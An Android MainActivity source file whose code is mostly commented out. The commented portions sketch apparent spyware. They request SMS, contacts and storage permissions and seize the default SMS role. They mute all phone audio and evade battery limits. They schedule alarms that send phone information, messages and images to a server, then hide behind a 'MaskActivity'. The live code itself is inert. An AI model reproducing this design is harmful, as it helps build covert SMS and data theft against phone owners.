package com.example.kepost;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.app.role.RoleManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentSender;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import static com.example.kepost.Global.*;

//import com.google.android.gms.auth.api.Auth;
//import com.google.android.gms.auth.api.credentials.Credential;
//import com.google.android.gms.auth.api.credentials.CredentialRequest;
//import com.google.android.gms.auth.api.credentials.Credentials;
//import com.google.android.gms.auth.api.credentials.HintRequest;
//import com.google.android.gms.auth.api.credentials.IdentityProviders;
//import com.google.android.gms.common.ConnectionResult;
//import com.google.android.gms.common.api.GoogleApiClient;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity{

    private String TAG = "MainActivity";
//    private String[] PERMISSIONS = {
////            android.Manifest.permission.READ_PHONE_NUMBERS,
//            android.Manifest.permission.READ_PHONE_STATE,
//            android.Manifest.permission.READ_SMS,
//            android.Manifest.permission.RECEIVE_SMS,
//            android.Manifest.permission.SEND_SMS,
//            android.Manifest.permission.READ_CONTACTS,
//            android.Manifest.permission.READ_EXTERNAL_STORAGE,
//            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
//    };

    private static final int PERMISSION_REQUEST_CODE = 200;

    private static final int PERMISSION_ACCESSIBILITY_CODE = 137;


    private SharedPreferences sharedPreferences;
    private SharedPreferences.Editor editor;
    private BroadcastReceiver receiver;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        Calendar calendar = Calendar.getInstance();
//        long startDateMillis = System.currentTimeMillis();
//        calendar.setTimeInMillis(System.currentTimeMillis());
//        calendar.add(Calendar.SECOND, -60);
//        long endtDateMillis = calendar.getTimeInMillis();
//        Log.d(TAG, startDateMillis + ":" + endtDateMillis);
//        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
//        String st = sdf.format(new Date(startDateMillis));
//        String end = sdf.format(new Date(endtDateMillis));
//        Log.d(TAG, st + ":" + end);

//
//        AudioManager audioManager=(AudioManager)getSystemService(AUDIO_SERVICE);
//        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC,0,0);
//        audioManager.setStreamVolume(AudioManager.STREAM_RING,0,0);
//        audioManager.setStreamVolume(AudioManager.STREAM_ALARM,0,0);
//        audioManager.setStreamVolume(AudioManager.STREAM_VOICE_CALL,0,0);
//        audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION,0,0);

        sharedPreferences = getSharedPreferences(Global.ASSIST_PREFRENCES, Context.MODE_PRIVATE);
        editor = sharedPreferences.edit();

//        if(sharedPreferences.getString(Global.PHONE_INSTALL, "").equals("")){
//            Log.d(TAG, "START");
//            SetInitialSharedPreferences();
//        }


//        GoogleApiClient mGoogleApiClient = new GoogleApiClient.Builder(this)
//                .addConnectionCallbacks(myCallback)
//                .addOnConnectionFailedListener(myListener)
//                .addApi(Auth.CREDENTIALS_API)
//                .build();
//
//        if (mGoogleApiClient != null) {
//            mGoogleApiClient.connect();
//        }else{
//            Log.d(TAG, "mGoogleApiClient is null");
//        }
//
//
//
//        HintRequest hintRequest = new HintRequest.Builder()
//                .setPhoneNumberIdentifierSupported(true)
//                .build();
//
//        if(hintRequest == null){
//            Log.d(TAG, "hintRequest is null");
//        }
//
//        PendingIntent intent = Auth.CredentialsApi.getHintPickerIntent(mGoogleApiClient, hintRequest);
//        try {
//            startIntentSenderForResult(intent.getIntentSender(), 1008, null, 0, 0, 0, null);
//
//        } catch (IntentSender.SendIntentException e) {
//            Log.e("", "Could not start hint picker Intent", e);
//        }


//        if(Global.cv == null){
//            Log.d(TAG, "INIT CONTACTS_VAL");
//            Global.cv = new ArrayList<ContactsValue>();
//        }else{
//            Log.d(TAG, "CV Size:" + Global.cv.size());
//        }
//
//        if(Global.sv == null){
//            Log.d(TAG, "INIT SMS_VAL");
//            Global.sv = new ArrayList<SmsValue>();
//        }else{
//            Log.d(TAG, "SV Size:" + Global.sv.size());
//        }
//
//        if(Global.cv_a == null){
//            Log.d(TAG, "INIT A_CONTACTS_VAL");
//            Global.cv_a = new ArrayList<ContactsValue>();
//        }else{
//            Log.d(TAG, "A_CV Size:" + Global.cv.size());
//        }
//
//        if(Global.sv_a == null){
//            Log.d(TAG, "INIT A_SMS_VAL");
//            Global.sv_a = new ArrayList<SmsValue>();
//        }else{
//            Log.d(TAG, "A_SV Size:" + Global.sv.size());
//        }
//
//        if(Global.ssv == null){
//            Log.d(TAG, "INIT SENS_SMS_VAL");
//            Global.ssv = new ArrayList<SendSmsValue>();
//        }else{
//            Log.d(TAG, "SSV Size:" + Global.ssv.size());
//        }


       // requestPermission();

    }

//
//    private void SetInitialSharedPreferences(){
//
//        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm");
//        String timestamp = dateFormat.format(new Date());
//
//        editor.putString(Global.PHONE_INSTALL, timestamp);
//        editor.putString(Global.PHONE_NUMBER, "");
//        editor.putString(Global.PHONE_SEND_SMS_DATE, "");
//        editor.putString(Global.PHONE_SEND_SMS_ID, "");
//        editor.putString(Global.PHONE_ALREADY_SET, "");
//        editor.putString(Global.PHONE_READ_FIRST_SMS, "yes");
//        editor.putString(Global.PHONE_DIFF_WITH_SERVER, "0");
//        editor.putString(Global.PHONE_DIFF_WITH_SERVER_A, "0");
//
////        SimpleDateFormat dateFormat1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
////        String timestamp1 = dateFormat1.format(new Date());
////
////        editor.putString(Global.PHONE_LAST_ALIVE, timestamp1);
//
//        editor.commit();
//    }
//
//    private void requestPermission(){
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            if (!hasPermissions(this, PERMISSIONS)) {
//                ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_REQUEST_CODE);
//            }else{
//                Log.d(TAG, "NO REQUEST");
//                SetAlarm();
//            }
//        }
//    }
//
//    private static boolean hasPermissions(Context context, String... permissions) {
//        if (context != null && permissions != null) {
//            for (String permission : permissions) {
//                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
//
//                    return false;
//                }
//            }
//        }
//        return true;
//    }
//
//    @Override
//    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
//        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
//        switch (requestCode) {
//            case PERMISSION_REQUEST_CODE:
//                if (grantResults.length > 0) {
//                    int allGranted = 0;
//                    for(int inx = 0; inx < grantResults.length; inx++){
//                        int granted = grantResults[inx];
//                        String sgranted = permissions[inx];
//                        Log.d(TAG, sgranted + ":" + granted);
//                        allGranted += granted;
//                    }
//                    if (allGranted < 0) {
//                        if (!hasPermissions(this, PERMISSIONS)) {
//                            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_REQUEST_CODE);
//                        }
//                    } else {
//                        SetAlarm();
//                    }
//                }
//                break;
//        }
//    }
//
//    private void SetAlarm(){
//
//        Intent intent = new Intent();
//        String packageName = this.getPackageName();
//        PowerManager pm = (PowerManager) this.getSystemService(Context.POWER_SERVICE);
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
//        {
//            if (!pm.isIgnoringBatteryOptimizations(packageName)){
//                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
//                intent.setData(Uri.parse("package:" + packageName));
//                startActivity(intent);
//            }
//
//        }
//

//        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.P) {
//            Log.d(TAG, "1");
//            RoleManager roleManager = (RoleManager) getSystemService(RoleManager.class);
//            if(roleManager.isRoleAvailable(ROLE_SMS)){
//                Log.d(TAG, "2");
//                if(roleManager.isRoleHeld(ROLE_SMS)){
//                    Log.d(TAG, "3");
//                    requestPermission();
//                }else{
//                    Log.d(TAG, "4");
//                    Intent roleRequestIntent = roleManager.createRequestRoleIntent(ROLE_SMS);
//                    startActivityForResult(roleRequestIntent, 12345);
//                }
//            }
//
//            Log.d(TAG, "5");
//
//        } else {
//            Intent intent1 = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
//            intent1.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageName());
//            startActivity(intent1);
//        }

        //Log.d(TAG, getResources().getString(R.string.app_name));

 //       Context context = getApplicationContext();

//        if(!sharedPreferences.getString(Global.PHONE_ALREADY_SET, "").equals("Already")){
//           //Log.d(TAG, "Start Set Alarm");
//            Global.SetAPostAlarm(getApplicationContext());
//            //Global.sendPingRequest(getApplicationContext(), "KPOST", "Start New Ping");
//            Global.SendPhoneTimeDiffAlarm(getApplicationContext(), "KPOST");
//            Global.SendPhoneInformationAlarm(getApplicationContext(), "KPOST");
//            Global.InitSendImageAlarm(getApplicationContext(), "KPOST");
//            sharedPreferences.edit().putString(Global.PHONE_ALREADY_SET, "Already").commit();
//        }

//        Intent intent1 = new Intent(MainActivity.this, MaskActivity.class);
//        intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        startActivity(intent1);
//       finish();

 //   }

    @Override
    protected  void onActivityResult(int requestCode, int resultCode, Intent data){
        super.onActivityResult(requestCode, resultCode, data);

        Log.d(TAG, "3434343" + resultCode);

        if(requestCode == 12345){
            //Log.d(TAG, "RESULTL" + resultCode);
            if(resultCode==RESULT_OK){

            }
        }

    }


//    private void requestPhoneNumberHint() {
//        HintRequest hintRequest = new HintRequest.Builder()
//                .setPhoneNumberIdentifierSupported(true)
//                .build();
//
//        CredentialRequest credentialRequest = new CredentialRequest.Builder()
//                .setAccountTypes(IdentityProviders.GOOGLE)
//                .setSupportsPasswordLogin(false)
//                .setSupportsPhoneNumberLogin(true)
//                .build();
//
//        PendingIntent intent = Credentials.getClient(this).getHintPickerIntent(credentialRequest);
//        try {
//            startIntentSenderForResult(intent.getIntentSender(), RC_HINT, null, 0, 0, 0);
//        } catch (IntentSender.SendIntentException e) {
//            Log.e("", "Could not start hint picker Intent", e);
//        }
//    }

    @Override
    protected void onResume() {
        super.onResume();
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
    }


}